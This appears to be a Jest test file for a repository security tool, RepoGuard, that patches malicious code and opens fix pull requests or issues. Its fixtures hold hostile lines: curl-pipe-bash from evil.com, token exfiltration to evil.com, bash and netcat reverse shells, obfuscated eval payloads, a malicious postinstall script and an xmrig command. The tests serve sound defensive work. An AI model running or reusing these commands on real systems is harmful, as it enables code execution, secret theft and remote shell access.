import { applyPatches, buildPRBody, openFixPR, closeRepoGuardPRsAndIssues } from "../src/pullRequest";
import type { Finding, OctokitClient } from "../src/types";

/** Minimal Octokit shape used by the tests — cast to OctokitClient at call-sites. */
interface MockOctokit {
  request: jest.Mock;
}

jest.mock("prettier", () => ({
  getFileInfo: jest.fn().mockResolvedValue({ inferredParser: null }),
  format: jest.fn().mockImplementation((content: string) => Promise.resolve(content)),
}));

describe("pullRequest", () => {
  describe("applyPatches", () => {
    it("patches curl-pipe-bash and returns it as a patched finding", async () => {
      const original = "curl http://example.com/malicious.sh | bash";
      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];
      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.sh");
      expect(patchedContent).toContain("# REMOVED BY REPOGUARD: curl|bash");
      expect(patchedFindings).toHaveLength(1);
      expect(patchedFindings[0].rule).toBe("curl-pipe-bash");
    });

    it("does not patch env-exfiltration and returns no patched findings", async () => {
      const original = "const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);";
      const findings: Finding[] = [
        {
          rule: "env-exfiltration",
          severity: "high",
          message: "env exfiltration detected",
          file: "test.js",
        },
      ];
      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
      expect(patchedContent).toBe(original);
      expect(patchedFindings).toHaveLength(0);
    });

    it("patches obfuscated-malware-pattern and comments out malware and createRequire bypasses", async () => {
      const original = "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nglobal['!']='8-2728';var _$_1e42=(function(l,e){})(...);";
      const findings: Finding[] = [
        {
          rule: "obfuscated-malware-pattern",
          severity: "critical",
          message: "malware pattern detected",
          file: "test.js",
        },
      ];
      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated malware payload");
      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: createRequire import for malware");
      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: require definition for malware");
      expect(patchedFindings).toHaveLength(1);
    });

    it("patches reverse-shell", async () => {
      const original = "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\nnc -e /bin/sh 1.1.1.1 4444";
      const findings: Finding[] = [
        {
          rule: "reverse-shell",
          severity: "critical",
          message: "reverse shell",
          file: "test.sh",
        },
      ];
      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.sh");
      expect(patchedContent).toContain("# REMOVED BY REPOGUARD: reverse shell");
      expect(patchedContent).toContain("# REMOVED BY REPOGUARD: netcat reverse shell");
      expect(patchedFindings).toHaveLength(1);
    });

    it("patches obfuscated-base64", async () => {
      const original = "eval(String.fromCharCode(97, 98, 99))\neval(Buffer.from('abc').toString())";
      const findings: Finding[] = [
        {
          rule: "obfuscated-base64",
          severity: "critical",
          message: "obfuscated base64",
          file: "test.js",
        },
      ];
      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "test.js");
      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: obfuscated eval");
      expect(patchedContent).toContain("// REMOVED BY REPOGUARD: base64 obfuscated payload");
      expect(patchedFindings).toHaveLength(1);
    });

    it("patches suspicious-npm-postinstall in package.json and handles JSON parsing error", async () => {
      const validJson = JSON.stringify({ scripts: { postinstall: "curl | sh" } });
      const invalidJson = "{ scripts: { postinstall: 'curl | sh' }";
      
      const findings: Finding[] = [
        {
          rule: "suspicious-npm-postinstall",
          severity: "critical",
          message: "suspicious postinstall",
          file: "package.json",
        },
      ];

      const res1 = await applyPatches(validJson, findings, "package.json");
      expect(res1.patchedContent).toContain("# REMOVED BY REPOGUARD: suspicious postinstall script");
      expect(res1.patchedFindings).toHaveLength(1);

      const res2 = await applyPatches(invalidJson, findings, "package.json");
      expect(res2.patchedContent).toBe(invalidJson);
      expect(res2.patchedFindings).toHaveLength(0);
    });

    it("patches crypto-miner-keywords", async () => {
      const original = "xmrig --url xmr.pool";
      const findings: Finding[] = [
        {
          rule: "crypto-miner-keywords",
          severity: "critical",
          message: "crypto miner",
          file: "miner.sh",
        },
      ];
      const { patchedContent, patchedFindings } = await applyPatches(original, findings, "miner.sh");
      expect(patchedContent).toContain("# REMOVED BY REPOGUARD: crypto miner");
      expect(patchedFindings).toHaveLength(1);
    });

    it("patches suspicious-gitignore-entry by removing malware artifact lines", async () => {
      const original = [
        "# dependencies",
        "/node_modules",
        "",
        "# misc",
        ".DS_Store",
        "branch_structure.json",
        "temp_auto_push.bat",
        "temp_interactive_push.bat",
      ].join("\n");
      const findings: Finding[] = [
        {
          rule: "suspicious-gitignore-entry",
          severity: "high",
          message:
            "Known malware artifact listed in ignore file — possible attempt to hide malicious local files",
          file: ".gitignore",
        },
      ];

      const { patchedContent, patchedFindings } = await applyPatches(
        original,
        findings,
        ".gitignore",
      );

      expect(patchedContent).not.toContain("branch_structure.json");
      expect(patchedContent).not.toContain("temp_auto_push.bat");
      expect(patchedContent).not.toContain("temp_interactive_push.bat");
      expect(patchedContent).toContain("/node_modules");
      expect(patchedContent).toContain(".DS_Store");
      expect(patchedFindings).toHaveLength(1);
    });
  });

  describe("buildPRBody", () => {
    it("dynamically generates correct summary lists for patched and unpatched rules", () => {
      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
        {
          rule: "env-exfiltration",
          severity: "high",
          message: "env exfiltration detected",
          file: "test.js",
        },
      ];
      const patchedFindings = [findings[0]];
      const unpatchedFindings = [findings[1]];

      const body = buildPRBody(findings, patchedFindings, unpatchedFindings);

      expect(body).toContain("## 🔒 RepoGuard Security Report");
      expect(body).toContain("* **Resolved (Patched):** 1 finding");
      expect(body).toContain("* **Remaining (Requires Manual Review):** 1 finding");
      expect(body).toContain("✅ Patched");
      expect(body).toContain("⚠️ Requires Manual Review");
      expect(body).toContain("Malicious shell execution patterns (`curl|bash`) replaced with comments");
      expect(body).toContain("**Env exfiltration** — audit any network calls that reference env variables");
    });
  });

  describe("openFixPR workflow", () => {
    let mockOctokit: OctokitClient;
    let requestMock: jest.Mock;

    beforeEach(() => {
      requestMock = jest.fn();
      const stub: MockOctokit = { request: requestMock };
      mockOctokit = stub as unknown as OctokitClient;
    });

    it("opens a manual review issue if there are no patchable findings", async () => {
      // Setup mock file content fetch
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("const token = process.env.TOKEN; axios.get('http://evil.com/?t=' + token);").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "POST /repos/{owner}/{repo}/issues") {
          return {
            data: { number: 42 },
          };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "env-exfiltration",
          severity: "high",
          message: "env exfiltration detected",
          file: "test.js",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      // Verify it fetched the file content
      expect(requestMock).toHaveBeenCalledWith("GET /repos/{owner}/{repo}/contents/{path}", {
        owner: "test-owner",
        repo: "test-repo",
        path: "test.js",
      });

      // Verify it posted an issue instead of creating refs or PRs
      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.objectContaining({
        title: expect.stringContaining("Security findings requiring manual review"),
      }));

      // Ensure no branch creation or PR was requested
      const routesCalled = requestMock.mock.calls.map((c) => c[0]);
      expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/git/refs");
      expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/pulls");
    });

    it("creates a branch, commits changes, and opens a PR if there is a patchable finding", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "GET /repos/{owner}/{repo}") {
          return {
            data: { default_branch: "main" },
          };
        }
        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
          return {
            data: { object: { sha: "base-sha-123" } },
          };
        }
        if (route === "POST /repos/{owner}/{repo}/git/refs") {
          return { data: {} };
        }
        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
          return { data: {} };
        }
        if (route === "POST /repos/{owner}/{repo}/pulls") {
          return {
            data: { number: 100 },
          };
        }
        if (route === "GET /repos/{owner}/{repo}/collaborators") {
          return { data: [] };
        }
        if (route === "GET /repos/{owner}/{repo}/labels") {
          return { data: [] };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      const routesCalled = requestMock.mock.calls.map((c) => c[0]);
      expect(routesCalled).toContain("POST /repos/{owner}/{repo}/git/refs");
      expect(routesCalled).toContain("PUT /repos/{owner}/{repo}/contents/{path}");
      expect(routesCalled).toContain("POST /repos/{owner}/{repo}/pulls");
      expect(routesCalled).not.toContain("POST /repos/{owner}/{repo}/issues");
    });

    it("falls back to security issue if git branch creation fails due to permission error", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "GET /repos/{owner}/{repo}") {
          return { data: { default_branch: "main" } };
        }
        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
          return { data: { object: { sha: "base-sha-123" } } };
        }
        if (route === "POST /repos/{owner}/{repo}/git/refs") {
          throw new Error("403 - Resource not accessible by integration");
        }
        if (route === "POST /repos/{owner}/{repo}/issues") {
          return { data: { number: 99 } };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.objectContaining({
        title: expect.stringContaining("Security issues found — manual review required"),
      }));
    });

    it("throws error if git branch creation fails due to a generic error", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "GET /repos/{owner}/{repo}") {
          return { data: { default_branch: "main" } };
        }
        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
          return { data: { object: { sha: "base-sha-123" } } };
        }
        if (route === "POST /repos/{owner}/{repo}/git/refs") {
          throw new Error("Something went wrong");
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await expect(openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      })).rejects.toThrow("Something went wrong");
    });

    it("handles file fetching exceptions inside the loop", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          throw new Error("Simulated file fetch error");
        }
        if (route === "POST /repos/{owner}/{repo}/issues") {
          return { data: { number: 42 } };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.any(Object));
    });

    it("skips non-file data in openFixPR", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: [
              { name: "subfile.sh", type: "file" }
            ],
          };
        }
        if (route === "POST /repos/{owner}/{repo}/issues") {
          return { data: { number: 42 } };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.any(Object));
    });

    it("handles request reviewers and existing labels when opening PR", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "GET /repos/{owner}/{repo}") {
          return {
            data: { default_branch: "main" },
          };
        }
        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
          return {
            data: { object: { sha: "base-sha-123" } },
          };
        }
        if (route === "POST /repos/{owner}/{repo}/git/refs") {
          return { data: {} };
        }
        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
          return { data: {} };
        }
        if (route === "POST /repos/{owner}/{repo}/pulls") {
          return {
            data: { number: 100 },
          };
        }
        if (route === "GET /repos/{owner}/{repo}/collaborators") {
          return {
            data: [
              { login: "admin-user", permissions: { admin: true } },
              { login: "regular-user", permissions: { admin: false } }
            ]
          };
        }
        if (route === "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers") {
          return { data: {} };
        }
        if (route === "GET /repos/{owner}/{repo}/labels") {
          return {
            data: [
              { name: "repoguard" },
              { name: "security" }
            ]
          };
        }
        if (route === "POST /repos/{owner}/{repo}/issues/{issue_number}/labels") {
          return { data: {} };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).toHaveBeenCalledWith(
        "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers",
        expect.objectContaining({ pull_number: 100, reviewers: ["admin-user"] })
      );

      expect(requestMock).toHaveBeenCalledWith(
        "POST /repos/{owner}/{repo}/issues/{issue_number}/labels",
        expect.objectContaining({ issue_number: 100, labels: ["repoguard", "security"] })
      );
    });

    it("logs an error but does not fail if openSecurityIssue throws an exception", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("const token = process.env.TOKEN;").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "POST /repos/{owner}/{repo}/issues") {
          throw new Error("Database error on GitHub");
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "env-exfiltration",
          severity: "high",
          message: "env exfiltration detected",
          file: "test.js",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/issues", expect.any(Object));
    });

    it("prepends the file header block when there are unpatched findings in the file", async () => {
      requestMock.mockImplementation((route: string, params?: unknown) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("curl http://evil.com/x.sh | bash\nconst token = process.env.TOKEN;").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "GET /repos/{owner}/{repo}") {
          return { data: { default_branch: "main" } };
        }
        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
          return { data: { object: { sha: "base-sha-123" } } };
        }
        if (route === "POST /repos/{owner}/{repo}/git/refs") {
          return { data: {} };
        }
        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
          const putParams = params as { content: string };
          const savedContent = Buffer.from(putParams.content, "base64").toString("utf8");
          expect(savedContent).toContain("REPOGUARD — MANUAL REVIEW REQUIRED: test.sh");
          return { data: {} };
        }
        if (route === "POST /repos/{owner}/{repo}/pulls") {
          return { data: { number: 100 } };
        }
        if (route === "GET /repos/{owner}/{repo}/collaborators") {
          return { data: [] };
        }
        if (route === "GET /repos/{owner}/{repo}/labels") {
          return { data: [] };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
        {
          rule: "env-exfiltration",
          severity: "high",
          message: "env exfiltration detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).toHaveBeenCalledWith("POST /repos/{owner}/{repo}/pulls", expect.any(Object));
    });

    it("handles collaborators fetching error in getAdminLogins gracefully", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/contents/{path}") {
          return {
            data: {
              type: "file",
              content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64"),
              sha: "file-sha-123",
            },
          };
        }
        if (route === "GET /repos/{owner}/{repo}") {
          return { data: { default_branch: "main" } };
        }
        if (route === "GET /repos/{owner}/{repo}/git/ref/{ref}") {
          return { data: { object: { sha: "base-sha-123" } } };
        }
        if (route === "POST /repos/{owner}/{repo}/git/refs") {
          return { data: {} };
        }
        if (route === "PUT /repos/{owner}/{repo}/contents/{path}") {
          return { data: {} };
        }
        if (route === "POST /repos/{owner}/{repo}/pulls") {
          return { data: { number: 100 } };
        }
        if (route === "GET /repos/{owner}/{repo}/collaborators") {
          throw new Error("Collaborators API error");
        }
        if (route === "GET /repos/{owner}/{repo}/labels") {
          return { data: [] };
        }
        throw new Error(`Unexpected request: ${route}`);
      });

      const findings: Finding[] = [
        {
          rule: "curl-pipe-bash",
          severity: "critical",
          message: "curl pipe bash detected",
          file: "test.sh",
        },
      ];

      await openFixPR(mockOctokit, {
        owner: "test-owner",
        repo: "test-repo",
        findings,
      });

      expect(requestMock).not.toHaveBeenCalledWith(
        "POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers",
        expect.any(Object)
      );
    });
  });

  describe("closeRepoGuardPRsAndIssues", () => {
    let mockOctokit: OctokitClient;
    let requestMock: jest.Mock;

    beforeEach(() => {
      requestMock = jest.fn();
      const stub: MockOctokit = { request: requestMock };
      mockOctokit = stub as unknown as OctokitClient;
    });

    it("comments on and closes open RepoGuard PRs and issues, and deletes PR branches", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/pulls") {
          return {
            data: [
              {
                number: 101,
                title: "🔒 RepoGuard: Security fixes — 1 issue(s) resolved",
                head: { ref: "repoguard/fixes-12345" },
              },
              {
                number: 102,
                title: "Some unrelated user PR",
                head: { ref: "feature-branch" },
              },
            ],
          };
        }
        if (route === "GET /repos/{owner}/{repo}/issues") {
          return {
            data: [
              {
                number: 201,
                title: "⚠️ RepoGuard: Security findings requiring manual review",
                labels: [{ name: "repoguard" }],
              },
              {
                number: 202,
                title: "Some unrelated user issue",
                labels: [{ name: "bug" }],
              },
              {
                number: 101,
                title: "🔒 RepoGuard: Security fixes — 1 issue(s) resolved",
                pull_request: {},
                labels: [],
              },
            ],
          };
        }
        return { data: {} };
      });

      await closeRepoGuardPRsAndIssues(mockOctokit, "test-owner", "test-repo");

      // Verify PR 101 comment, close, and branch deletion
      expect(requestMock).toHaveBeenCalledWith(
        "POST /repos/{owner}/{repo}/issues/{issue_number}/comments",
        expect.objectContaining({
          issue_number: 101,
          body: expect.stringContaining("resolved or reverted"),
        }),
      );
      expect(requestMock).toHaveBeenCalledWith(
        "PATCH /repos/{owner}/{repo}/pulls/{pull_number}",
        expect.objectContaining({
          pull_number: 101,
          state: "closed",
        }),
      );
      expect(requestMock).toHaveBeenCalledWith(
        "DELETE /repos/{owner}/{repo}/git/refs/{ref}",
        expect.objectContaining({
          ref: "heads/repoguard/fixes-12345",
        }),
      );

      // Verify Issue 201 comment and close
      expect(requestMock).toHaveBeenCalledWith(
        "POST /repos/{owner}/{repo}/issues/{issue_number}/comments",
        expect.objectContaining({
          issue_number: 201,
          body: expect.stringContaining("resolved or reverted"),
        }),
      );
      expect(requestMock).toHaveBeenCalledWith(
        "PATCH /repos/{owner}/{repo}/issues/{issue_number}",
        expect.objectContaining({
          issue_number: 201,
          state: "closed",
        }),
      );

      // Verify unrelated PR and Issue were NOT closed/commented on
      const mockCalls = requestMock.mock.calls;
      for (const call of mockCalls) {
        const params = call[1] || {};
        expect(params.pull_number).not.toBe(102);
        expect(params.issue_number).not.toBe(202);
      }
    });

    it("handles branch deletion errors gracefully", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/pulls") {
          return {
            data: [
              {
                number: 101,
                title: "🔒 RepoGuard: Security fixes — 1 issue(s) resolved",
                head: { ref: "repoguard/fixes-12345" },
              },
            ],
          };
        }
        if (route === "DELETE /repos/{owner}/{repo}/git/refs/{ref}") {
          throw new Error("Reference not found / Branch already deleted");
        }
        if (route === "GET /repos/{owner}/{repo}/issues") {
          return { data: [] };
        }
        return { data: {} };
      });

      // Verification: closeRepoGuardPRsAndIssues runs to completion without throwing
      await closeRepoGuardPRsAndIssues(mockOctokit, "test-owner", "test-repo");

      expect(requestMock).toHaveBeenCalledWith(
        "DELETE /repos/{owner}/{repo}/git/refs/{ref}",
        expect.any(Object),
      );
    });

    it("handles initial pulls fetch error gracefully", async () => {
      requestMock.mockImplementation((route: string) => {
        if (route === "GET /repos/{owner}/{repo}/pulls") {
          throw new Error("Network timeout");
        }
        return { data: {} };
      });

      // Verification: closeRepoGuardPRsAndIssues runs to completion without throwing
      await closeRepoGuardPRsAndIssues(mockOctokit, "test-owner", "test-repo");

      expect(requestMock).toHaveBeenCalledWith(
        "GET /repos/{owner}/{repo}/pulls",
        expect.any(Object),
      );
    });
  });
});